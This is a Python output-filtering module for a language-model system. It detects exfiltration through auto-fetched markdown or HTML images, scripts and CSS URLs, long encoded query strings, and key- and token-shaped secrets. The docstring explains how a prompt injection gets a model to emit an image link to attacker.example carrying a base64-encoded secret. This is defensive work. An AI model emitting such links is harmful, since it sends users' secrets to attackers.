"""Output filtering: catching exfiltration on the way out.

The channel people forget. An injected instruction does not need the model to
*say* anything sensitive -- it only needs the model to emit a URL that a client
will fetch. A markdown image is the classic:

    ![](https://attacker.example/log?d=<the secret, base64>)

The user's renderer requests that URL automatically. Nothing was "leaked" in the
text; the request itself is the leak. Which is why output filtering checks
*renderable, auto-fetched constructs* first and prose second.

Secret detection is the noisier half and is included because it is cheap, not
because it is reliable: format-based matching finds keys shaped like keys and
misses everything else.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field

# Constructs a client fetches or executes without the user doing anything.
AUTO_FETCH_PATTERNS = [
    (r"!\[[^\]]*\]\((?P<url>[^)]+)\)", "markdown image (fetched on render)", 0.9),
    (r"<img[^>]+src=[\"'](?P<url>[^\"']+)", "html image (fetched on render)", 0.9),
    (r"<script[^>]*src=[\"'](?P<url>[^\"']+)", "remote script", 1.0),
    (r"<iframe[^>]+src=[\"'](?P<url>[^\"']+)", "iframe", 0.9),
    (r"url\(\s*[\"']?(?P<url>https?://[^)\"']+)", "css url()", 0.8),
]

LINK_PATTERN = r"\[[^\]]*\]\((?P<url>https?://[^)]+)\)|(?P<bare>https?://\S+)"

SECRET_PATTERNS = [
    (r"\bAKIA[0-9A-Z]{16}\b", "aws access key id"),
    (r"\bsk-[A-Za-z0-9]{20,}\b", "api key (sk- prefix)"),
    (r"\bghp_[A-Za-z0-9]{36}\b", "github token"),
    (r"-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----", "private key"),
    (r"\bxox[baprs]-[A-Za-z0-9-]{10,}\b", "slack token"),
    (r"\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b", "jwt"),
]


@dataclass
class OutputFinding:
    kind: str
    detail: str
    severity: float
    span: tuple[int, int] = (0, 0)


@dataclass
class OutputVerdict:
    allowed: bool
    findings: list[OutputFinding] = field(default_factory=list)
    redacted: str = ""

    @property
    def severity(self) -> float:
        return max((f.severity for f in self.findings), default=0.0)


class OutputFilter:
    def __init__(self, allowed_domains: tuple[str, ...] = (), block_threshold: float = 0.8):
        self.allowed_domains = tuple(d.lower() for d in allowed_domains)
        self.block_threshold = block_threshold

    def _domain_allowed(self, url: str) -> bool:
        from urllib.parse import urlparse

        if not self.allowed_domains:
            return False
        host = (urlparse(url).hostname or "").lower()
        return any(host == d or host.endswith("." + d) for d in self.allowed_domains)

    def inspect(self, text: str) -> OutputVerdict:
        findings: list[OutputFinding] = []

        for pattern, description, severity in AUTO_FETCH_PATTERNS:
            for match in re.finditer(pattern, text, re.IGNORECASE):
                url = match.groupdict().get("url", "")
                if self._domain_allowed(url):
                    continue
                findings.append(OutputFinding("auto_fetch", f"{description}: {url[:80]}",
                                              severity, match.span()))

        # A long opaque query string on an out-of-domain link is the shape of
        # encoded data, whatever it claims to be.
        for match in re.finditer(LINK_PATTERN, text):
            url = match.group("url") or match.group("bare") or ""
            if not url or self._domain_allowed(url):
                continue
            query = url.split("?", 1)[1] if "?" in url else ""
            if len(query) > 60:
                findings.append(OutputFinding(
                    "suspicious_link", f"long query string ({len(query)} chars): {url[:60]}",
                    0.7, match.span()))

        for pattern, description in SECRET_PATTERNS:
            for match in re.finditer(pattern, text):
                findings.append(OutputFinding("secret", description, 1.0, match.span()))

        verdict = OutputVerdict(allowed=True, findings=findings)
        verdict.allowed = verdict.severity < self.block_threshold
        verdict.redacted = self.redact(text, findings)
        return verdict

    def redact(self, text: str, findings: list[OutputFinding]) -> str:
        """Replace offending spans, right to left so earlier offsets stay valid."""
        result = text
        for finding in sorted(findings, key=lambda f: f.span[0], reverse=True):
            start, end = finding.span
            if end > start:
                result = result[:start] + f"[redacted: {finding.kind}]" + result[end:]
        return result
